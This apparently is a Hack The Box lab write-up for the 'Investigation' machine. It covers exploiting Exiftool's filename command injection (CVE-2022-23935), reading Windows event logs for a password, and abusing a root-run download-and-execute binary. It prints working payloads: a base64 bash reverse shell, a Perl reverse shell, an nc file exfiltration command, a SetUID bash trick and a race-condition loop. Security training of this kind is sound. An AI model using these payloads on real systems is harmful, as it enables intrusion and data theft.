---
title: HTB: Investigation
url: https://0xdf.gitlab.io/2023/04/22/htb-investigation.html
date: 2023-04-22T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-investigation, nmap, php, exiftool, feroxbuster, cve-2022-23935, command-injection, youtube, perl, open-injection, open-injection-perl, event-logs, msgconvert, mutt, mbox, evtx-dump, jq, ghidra, reverse-engineering, race-condition, htb-pikaboo, htb-meta
---

![Investigation](/img/investigation-cover.png)

Investigation starts with a website that accepts user uploaded images and runs Exiftool on them. This version has a command injection. I’ll dig into that vulnerability, and then exploit it to get a foothold. Then I find a set of Windows event logs, and analyze them to extract a password. Finally, I find a piece of malware that runs as root and understand it to get execution.

## Box Info

| Name | [Investigation](https://hackthebox.com/machines/investigation)  [Investigation](https://hackthebox.com/machines/investigation) [Play on HackTheBox](https://hackthebox.com/machines/investigation) |
| --- | --- |
| Release Date | [21 Jan 2023](https://twitter.com/hackthebox_eu/status/1616103239899914240) |
| Retire Date | 22 Apr 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Investigation |
| Radar Graph | Radar chart for Investigation |
| First Blood User | 00:17:46[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:23:49[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [Derezzed Derezzed](https://app.hackthebox.com/users/15515) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.197
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-18 07:03 EDT
Nmap scan report for 10.10.11.197
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.197
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-18 07:03 EDT
Nmap scan report for 10.10.11.197
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://eforenzics.htb/
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

There’s a redirect on port 80 to `eforenzics.htb`. I’ll use `wfuzz` to look for any subdomains that respond differently, but not find anything. I’ll add this to my `hosts` file:

```
10.10.11.197 eforenzics.htb

```

### Website - TCP 80

#### Site

The site is for a forensics company:

[![image-20230418073051838](/img/image-20230418073051838.png)](/img/image-20230418073051838.png)

[*Click for full image*](/img/image-20230418073051838.png)

All the links in the page are to other places on the page except for ones that go to `/service.html`. This page offers “Image Forensics”, specifically on JPG files:

![image-20230418083703426](/img/image-20230418083703426.png)

On giving it a JPG, it offers a link to a “report”:

![image-20230418083736570](/img/image-20230418083736570.png)

That report is `[original filename with special characters removed].txt`. So `htb.jpg` becomes `htbjpg.txt`:

```

ExifTool Version Number         : 12.37
File Name                       : htb.jpg
Directory                       : .
File Size                       : 6.3 KiB
File Modification Date/Time     : 2023:04:18 12:42:04+00:00
File Access Date/Time           : 2023:04:18 12:42:04+00:00
File Inode Change Date/Time     : 2023:04:18 12:42:04+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 200
Image Height                    : 200
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 200x200
Megapixels                      : 0.040

```

This is the output of [Exiftool](https://exiftool.org/).

#### Tech Stack

The pages on the site are `index.html` and `services.html`. However, when I upload an image it goes to `upload.php`, so it’s a PHP site with mostly static pages.

As noted above, Exiftool is being used to get metadata on the images, and the output shows it’s version 12.37.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php,html`:

```

oxdf@hacky$ feroxbuster -u http://eforenzics.htb -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://eforenzics.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      208l      629w    10957c http://eforenzics.htb/index.html
200      GET       82l      198w     3773c http://eforenzics.htb/upload.php
301      GET        9l       28w      317c http://eforenzics.htb/assets => http://eforenzics.htb/assets/
200      GET    10598l    42768w   280364c http://eforenzics.htb/assets/vendors/jquery/jquery-3.4.1.js
200      GET     1081l     1807w    16450c http://eforenzics.htb/assets/vendors/themify-icons/css/themify-icons.css
200      GET       32l       73w      780c http://eforenzics.htb/assets/js/efore.js
200      GET      162l      483w     4838c http://eforenzics.htb/assets/vendors/bootstrap/bootstrap.affix.js
200      GET      208l      629w    10957c http://eforenzics.htb/
200      GET       91l      227w     4335c http://eforenzics.htb/service.html
200      GET       76l      475w    36057c http://eforenzics.htb/assets/imgs/avatar3.jpg
200      GET       48l      247w    20651c http://eforenzics.htb/assets/imgs/avatar2.jpg
301      GET        9l       28w      321c http://eforenzics.htb/assets/css => http://eforenzics.htb/assets/css/
301      GET        9l       28w      320c http://eforenzics.htb/assets/js => http://eforenzics.htb/assets/js/
200      GET    11691l    23373w   242712c http://eforenzics.htb/assets/css/efore.css
200      GET     7013l    22369w   222911c http://eforenzics.htb/assets/vendors/bootstrap/bootstrap.bundle.js
200      GET       61l      353w    29810c http://eforenzics.htb/assets/imgs/avatar1.jpg
301      GET        9l       28w      322c http://eforenzics.htb/assets/imgs => http://eforenzics.htb/assets/imgs/
[####################] - 3m    645225/645225  0s      found:17      errors:177145 
[####################] - 3m    129024/129024  691/s   http://eforenzics.htb/ 
[####################] - 3m    129024/129024  693/s   http://eforenzics.htb/assets/ 
[####################] - 3m    129024/129024  696/s   http://eforenzics.htb/assets/js/ 
[####################] - 3m    129024/129024  692/s   http://eforenzics.htb/assets/css/ 
[####################] - 3m    129024/129024  689/s   http://eforenzics.htb/assets/imgs/ 

```

There’s a bunch there, but nothing interesting.

## Shell as www-data

### CVE-2022-23935

#### Identify

Googling for “exiftool 12.37”, the top result is about a command injection vulnerability in Exiftool before 12.38:

![image-20230418091540922](/img/image-20230418091540922.png)

The issue, as described in [this gist](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429), is in how Perl handles filenames ending in `|` with the `open` command. In [Pikaboo](/2021/12/04/htb-pikaboo.html#exploit-cvsupdate) I walked through abusing this on a script that was using Perl’s `<>` operator, which is a shorthand that includes a call to `open`. Exiftool is written in Perl, and before version 12.38, was missing that the filename (user controlled) could be used to get command execution.

There’s a different CVE in Exiftool that I exploited in [Meta](/2022/06/11/htb-meta.html#exiftool-exploit), CVE-2021-22204. That one involved poisoning the metadata, not the filename.

#### Vulnerability Details

Nothing in this section is required to continue with exploitation of Investigation. The gist gives a POC that I can move forward with, but it’s still interesting and worthwhile to understand how vulnerabilities work. I’ll explore that in [this video](https://www.youtube.com/watch?v=UiRx1Zkeqzg):

The summary points are:
- If a filename passed to `open` ends in `|`, the string before the `|` is executed and then the result (sent to STDOUT) is what is read from the resulting file handle.
- Exiftool actually makes use of that when it detects a file with a `.gz` or `.bz2` extension, changing the filename to something that will decompress it, and then handle the output. For example, `.gz` files become `gzip -dc "$file" |`.
- Later, when Exiftool opens the file, it explicitly checks for the `|` to see if it should open in the mode that allows for execution.
- If I run Exiftool on a file with its name ending in `|`, that filename will be interpreted as a command and executed.

### RCE

#### POC

To test this out, I’ll find the HTTP request where I submit an image in Burp Proxy history, and send it to Repeater:

![image-20230418125028031](/img/image-20230418125028031.png)

The filename is set in the form data metadata. I’ll change it to `ping -c 10.10.14.6|` and start `tcpdump` to listen for ICMP. On sending the request, an ICMP packet comes back:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:51:18.487116 IP 10.10.11.197 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
12:51:18.487125 IP 10.10.14.6 > 10.10.11.197: ICMP echo reply, id 2, seq 1, length 64

```

That’s code execution on Investigation.

#### Shell

To get a shell, I’ll try a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). It doesn’t work in raw form, likely because of the special characters required. I’ll base64-encode the shell, messing with extra whitespace until there’s no special characters (not always required, but can be helpful):

```

oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIAo=
oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1  ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK

```

Now I’ll send that as the `filename`:

![image-20230418125705292](/img/image-20230418125705292.png)

It hangs, but there’s a shell at a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 37680
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1681837009$

```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@investigation:~/uploads/1681837009$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@investigation:~/uploads/1681837009$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@investigation:~/uploads/1681837009$

```

## Shell as smorton

### Enumeration

#### smorton

There’s a single home directory on the box, and www-data can’t access it:

```

www-data@investigation:/$ ls /home/
smorton
www-data@investigation:/$ cd /home/smorton/
bash: cd: /home/smorton/: Permission denied

```

There’s not too much else interesting on the file system. I’ll look for files owned by smorton:

```

www-data@investigation:/$ find / -user smorton 2>/dev/null
/home/smorton
/usr/local/investigation/Windows Event Logs for Analysis.msg

```

The `investigation` directory is worth further investigation.

#### investigation Directory

There are two files in the directory:

```

www-data@investigation:/usr/local/investigation$ ls -l
total 1280
-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1  2022 'Windows Event Logs for Analysis.msg'
-rw-rw-r-- 1 www-data www-data       0 Oct  1  2022  analysed_log

```

`analysed_log` is always 0 bytes. There’s actually a `cron` running as www-data that should be writing to it every five minutes before it clears the images and analysis:

```

www-data@investigation:/usr/local/investigation$ crontab -l
...[snip]...
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*

```

The problem is, somehow `analysed_log` got set as immutable:

```

www-data@investigation:/usr/local/investigation$ lsattr analysed_log 
-u--i---------e----- analysed_log

```

So when the `cron` tries to write to it, it fails:

```

www-data@investigation:/usr/local/investigation$ date >> /usr/local/investigation/analysed_log
bash: /usr/local/investigation/analysed_log: Operation not permitted

```

Because the commands are joined with `&&`, once the first one fails, it stops, and the cleanup is broken as well.

I’ll exfil the `.msg` file with `nc`, starting a listener on my machine, and then sending the file back:

```

www-data@investigation:/usr/local/investigation$ cat Windows\ Event\ Logs\ for\ Analysis.msg | nc 10.10.14.6 443

```

It arrives at my machine:

```

oxdf@hacky$ nc -lnvp 443 > 'Windows Event Logs for Analysis.msg'
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 42746

```

I’ll double check that the MD5 hashes of each match.

### Event Log Analysis

#### Extract Message Attachment

`.msg` files are Outlook messages. Without a copy of Outlook handy, I’ll use `msgconvert` (installed with `sudo apt install libemail-outlook-message-perl`) to convert it to `mbox` format:

```

oxdf@hacky$ msgconvert Windows\ Event\ Logs\ for\ Analysis.msg --mbox emails.mbox

```

This writes the message into a mailbox in the `emails.mbox` file. I’ll open it with `mutt -f emails.mbox`. When it asks about creating a `Mail` file, I’ll select `no`, and it opens the mailbox with a single email:

![image-20230418132654341](/img/image-20230418132654341.png)

I’ll hit enter to go into the email:

![image-20230418132729865](/img/image-20230418132729865.png)

There’s a message from Tom and an attachment. I’ll hit `v` to view the attachments:

![image-20230418132808989](/img/image-20230418132808989.png)

I’ll arrow key down to `evtx-logs.zip` and push `s` to save. After exiting `mutt`, I’ll unzip the attachment:

```

oxdf@hacky$ unzip -l evtx-logs.zip 
Archive:  evtx-logs.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 15798272  2022-08-01 13:36   security.evtx
---------                     -------
 15798272                     1 file
oxdf@hacky$ unzip evtx-logs.zip 
Archive:  evtx-logs.zip
  inflating: security.evtx  

```

The file is a Windows Vista Event log:

```

oxdf@hacky$ file security.evtx 
security.evtx: MS Windows Vista Event Log, 238 chunks (no. 237 in use), next record no. 20013

```

#### Converting to JSON

To get this into a format I can analyze, I’ll convert the events to JSON. I played with a few different tools from GitHub to do this, but liked `evtx_dump` from [this repo by omerbenamram](https://github.com/omerbenamram/evtx). I’ll download the latest release and drop it in a folder in my boxes path.

The trick is to use the output format `jsonl` and not `json`. `json` will include lines with record numbers that breaks tools like `jq` when it tries to parse it. `jsonl` puts it all on one line of JSON, which `jq` can then parse:

```

oxdf@hacky$ evtx_dump security.evtx -o jsonl -t 1 -f security.json
oxdf@hacky$ cat security.json | jq . | head
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Channel": "Security",
      "Computer": "eForenzics-DI",
      "Correlation": null,
      "EventID": 1102,

```

#### Log Summary

I’ll start by getting a feel for the different types of logs present and their frequency:

```

oxdf@hacky$ cat security.json | jq -r '.Event.System.EventID' | sort -nr | uniq -c | sort -nr            
   5217 4673
   4266 4703
   2972 4658
   2319 4656
    752 4946
    685 4688
    657 4689
    612 4690
...[snip]...

```

The most common log type is 4673 ([A privileged service was called](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4673)) with over five thousand logs. Then there’s 4703 ([A token right was adjusted](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4703)) at over four thousand. I’ll take a look at these, but it doesn’t lead anywhere.

I’ll also take a look at the different log types. To show each one, I’ll use the reference I cited above in a Bash loop with a bit of `grep` to get the title:

```

oxdf@hacky$ cat security.json | jq -r '.Event.System.EventID' | sort -u | while read id; do curl -s https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=${id} | grep -A1 'class="hey"' | grep -v 'class="hey"'; done
        1102: The audit log was cleared
        4611: A trusted logon process has been registered with the Local Security Authority
        4624: An account was successfully logged on
        4625: An account failed to log on
        4627: Group membership information.
        4634: An account was logged off
...[snip]...

```

Some interesting ones jump out:
- `1102: The audit log was cleared` - might want to look at activity from that account around that time.
- `4624: An account was successfully logged on` - get a feel for the accounts logging in
- `4625: An account failed to log on` - look for any brute forces or other strange behavior
- `4688: A new process has been created` - look for any interesting processes on the box
- `4698: A scheduled task was created` and `4702: A scheduled task was updated` - look for any persistence
- `4732: A member was added to a security-enabled local group` - This can be very suspicious if it wasn’t done by an admin

There are probably others that might be interesting as well. I’ll start to work my way through these.

#### Logons

I’ll find something interesting looking at the successful and failed logins. The note from Tom mentions checking to see if analysts are logging into the investigation station.

I’ll filter out based on event ID and get a lot of data about each event:

```

{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "AuthenticationPackageName": "Negotiate",
      "ElevatedToken": "%%1843",
      "ImpersonationLevel": "%%1833",
      "IpAddress": "-",
      "IpPort": "-",
      "KeyLength": 0,
      "LmPackageName": "-",
      "LogonGuid": "00000000-0000-0000-0000-000000000000",
      "LogonProcessName": "Advapi  ",
      "LogonType": 2,
      "ProcessId": "0x10f0",
      "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
      "RestrictedAdminMode": "-",
      "SubjectDomainName": "WORKGROUP",
      "SubjectLogonId": "0x3e7",
      "SubjectUserName": "EFORENZICS-DI$",
      "SubjectUserSid": "S-1-5-18",
      "TargetDomainName": "Font Driver Host",
      "TargetLinkedLogonId": "0x0",
      "TargetLogonId": "0x2bff71",
      "TargetOutboundDomainName": "-",
      "TargetOutboundUserName": "-",
      "TargetUserName": "UMFD-3",
      "TargetUserSid": "S-1-5-96-0-3",
      "TransmittedServices": "-",
      "VirtualAccount": "%%1842",
      "WorkstationName": "-"
    },
    "System": {
      "Channel": "Security",
      "Computer": "eForenzics-DI",
      "Correlation": {
        "#attributes": {
          "ActivityID": "6A946884-A5BC-0001-D968-946ABCA5D801"
        }
      },
      "EventID": 4624,
      "EventRecordID": 11363364,
      "Execution": {
        "#attributes": {
          "ProcessID": 628,
          "ThreadID": 1664
        }
      },
      "Keywords": "0x8020000000000000",
      "Level": 0,
      "Opcode": 0,
      "Provider": {
        "#attributes": {
          "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
          "Name": "Microsoft-Windows-Security-Auditing"
        }
      },
      "Security": null,
      "Task": 12544,
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2022-08-01T16:00:39.944631Z"
        }
      },
      "Version": 2
    }
  }
}

```

I’ll print the username and domain for each for each with a count for how many times:

```

oxdf@hacky$ cat security.json | jq -r '. | select(.Event.System.EventID==4624) | .Event.EventData | .TargetDomainName + "\\" + .TargetUserName' | sort | uniq -c | sort -nr
     49 NT AUTHORITY\SYSTEM
      8 EFORENZICS-DI\SMorton
      4 Window Manager\DWM-3
      4 EFORENZICS-DI\LJenkins
      2 Window Manager\DWM-9
      2 Window Manager\DWM-8
      2 Window Manager\DWM-7
      2 Window Manager\DWM-6
      2 Window Manager\DWM-5
      2 Window Manager\DWM-4
      2 Font Driver Host\UMFD-3
      2 EFORENZICS-DI\LMonroe
      2 EFORENZICS-DI\HMarley
      2 EFORENZICS-DI\AAnderson
      1 Font Driver Host\UMFD-9
      1 Font Driver Host\UMFD-8
      1 Font Driver Host\UMFD-7
      1 Font Driver Host\UMFD-6
      1 Font Driver Host\UMFD-5
      1 Font Driver Host\UMFD-4

```

If I take the same look at the unsuccessful logins by changing the filter from 4624 to 4625, I’ll find three:

```

oxdf@hacky$ cat security.json | jq -r '. | select(.Event.System.EventID==4625) | .Event.EventData | .TargetDomainName + "\\" + .TargetUserName' | sort | uniq -c | sort -nr
      1 EFORENZICS-DI\lmonroe
      1 EFORENZICS-DI\hmraley
      1 \Def@ultf0r3nz!csPa$$

```

The first two match with users above, but the last one looks like a password, as if someone typed their password into the username field. This could happen when a user walks up to their computer and starts typing their password thinking they are going to unlock the computer, but they aren’t logged in for some reason.

### SSH

That password works for smorton over SSH:

```

oxdf@hacky$ sshpass -p 'Def@ultf0r3nz!csPa$$' ssh smorton@eforenzics.htb
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)
...[snip]...
smorton@investigation:~$

```

The user flag is now available:

```

smorton@investigation:~$ cat user.txt
fe330173************************

```

## Shell as root

### Enumeration

smorton can run `/usr/bin/binary` as root:

```

smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary

```

In fact, only root can run this:

```

smorton@investigation:~$ binary
-bash: /usr/bin/binary: Permission denied
smorton@investigation:~$ ls -l /usr/bin/binary 
-r-xr-xr-- 1 root root 19024 Jan  5 16:02 /usr/bin/binary

```

Running it just prints “Exiting…”:

```

smorton@investigation:~$ sudo binary
Exiting... 

```

### binary

#### Exfil

I’ll download a copy of the binary over `scp`:

```

oxdf@hacky$ sshpass -p 'Def@ultf0r3nz!csPa$$' scp smorton@eforenzics.htb:/usr/bin/binary .

```

#### Reversing

I’ll open it in Ghidra and take a look. All the action is in `main`. `main` has two arguments, `argc` which is the number of command line args, and `argv`, which is a pointer to the array of arguments. I’ll rename and retype those, as well as the other variables in the decompile.

The code starts by checking that there are two args (three counting the program name) and that the current user is root, exiting if either check fails:

```

  if (argc != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  userid = getuid();
  if (userid != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }

```

Then it verifies that the second arg is the string “lDnxUysaQn”:

```

  res = strcmp(argv[2],"lDnxUysaQn");
  if (res != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }

```

It opens that as a file for writing:

```

  puts("Running... ");
  filehandle = fopen(argv[2],"wb");

```

Next is uses `curl` to make a web request:

```

  curl_object = curl_easy_init();
  curl_easy_setopt(curl_object,0x2712,argv[1]);
  curl_easy_setopt(curl_object,0x2711,filehandle);
  curl_easy_setopt(curl_object,0x2d,1);
  res = curl_easy_perform(curl_object);

```

First it sets the URL (0x2712) to the first argument from the command line. Then it sets the output file (0x2711) to the filehandle from the `lDnxUysaQn` file. 0x2d sets verbose to true, and then it executes the curl command.

If the `curl` is successful, it does the following:

```

  if (res == 0) {
    res = snprintf((char *)0x0,0,"%s",argv[2]);
    arg2_str = (char *)malloc((long)res + 1);
    snprintf(arg2_str,(long)res + 1,"%s",argv[2]);
    res = snprintf((char *)0x0,0,"perl ./%s",arg2_str);
    cmd_str = (char *)malloc((long)res + 1);
    snprintf(cmd_str,(long)res + 1,"perl ./%s",arg2_str);
    fclose(filehandle);
    curl_easy_cleanup(curl_object);
    setuid(0);
    system(cmd_str);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

This code is taking a weird route to building a command string that looks like `perl ./[arg2]`. It’s running whatever was downloaded with `perl`. Then it cleans up, including removing that file, and returns.

This file doesn’t make a lot of sense unless I view it as a piece of malware that’s under analysis by this forensics firm.

### Execution

#### Obvious [Option 1]

To get a shell, I’ll write a simple Perl reverse shell (based on [revshells.com](https://www.revshells.com/)):

```

use Socket;
$i="10.10.14.6";
$p=443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("sh -i");
}

```

Now I simply host that on a Python webserver run `binary` with the URL pointing to it:

```

smorton@investigation:~$ sudo binary 10.10.14.6/shell.pl lDnxUysaQn
Running...

```

It fetches from my server:

```
10.10.11.197 - - [18/Apr/2023 16:07:48] "GET /shell.pl HTTP/1.1" 200 -

```

And there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 40802
# id
uid=0(root) gid=0(root) groups=0(root)

```

And I can read `root.txt`:

```

# cd /root
# cat root.txt
e9f2ff77************************

```

#### Bash [Option 2]

Ippsec pointed out to me that `perl script.sh` will respect the shebang line of the script. So if `script.sh` starts with `#!/bin/bash`, `perl` will pass that off to `bash` for execution. That means that I can create `shell.sh` that will create a SetUID copy of `bash`:

```

#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf

```

Running this the same way works:

```

smorton@investigation:~$ sudo binary 10.10.14.6/shell.sh lDnxUysaQn
Running... 
smorton@investigation:~$ /tmp/0xdf -p
0xdf-5.0# 

```

#### Race Condition [Option 3]

It’s also possible to exploit a race condition to abuse this binary. It gets the binary and writes the file, then does some calculations of string length and builds a string, and then calls `system` to run that string. Between the `curl` and the `system` calls, because it’s saving in the current directory, if that directory is one that my current user owns, I can move files even if I don’t own them and can’t write to them.

To illustrate this, I’ll listen with `nc` on 80 rather than a Python webserver. When I run the binary, it connects, leaving it in a hung state waiting for the server to respond. At this point, the output file exists and is empty:

```

smorton@investigation:~$ ls -l lDnxUysaQn 
-rw-r--r-- 1 root root 0 Apr 18 20:44 lDnxUysaQn

```

I can’t write to it, but I can move it:

```

smorton@investigation:~$ echo "test" > lDnxUysaQn 
-bash: lDnxUysaQn: Permission denied
smorton@investigation:~$ mv lDnxUysaQn 0xdf
smorton@investigation:~$ ls
0xdf  user.txt

```

To abuse this, I’ll create a script I want to get to run:

```

#!/bin/bash

id
echo "pwned"

```

Now I’ll get two shells on Investigation. In the first, I’ll run an infinite loop:

```

smorton@investigation:~$ while :; do if [ -f lDnxUysaQn ]; then mv -f lDnxUysaQn garbage ; cp -f 0xdf.sh lDnxUysaQn; sleep 1; rm lDnxUysaQn; fi; done

```

This checks for the existence of `lDnxUysaQn`, and if it’s there, moves it to `garbage` and copies `0xdf.sh` over it. Then it sleeps for a second and removes the file.

Now when I run `binary`, it doesn’t matter what’s in the file, but it has to exist (so that `curl` returns success and the file is executed). When I run this:

```

smorton@investigation:~$ sudo binary 10.10.14.6/race lDnxUysaQn
Running... 
uid=0(root) gid=0(root) groups=0(root)
pwned

```

It may not trigger every time, but it was most for me. Because it’s waiting for the file to appear, the timing works out that it moves it just at the right time.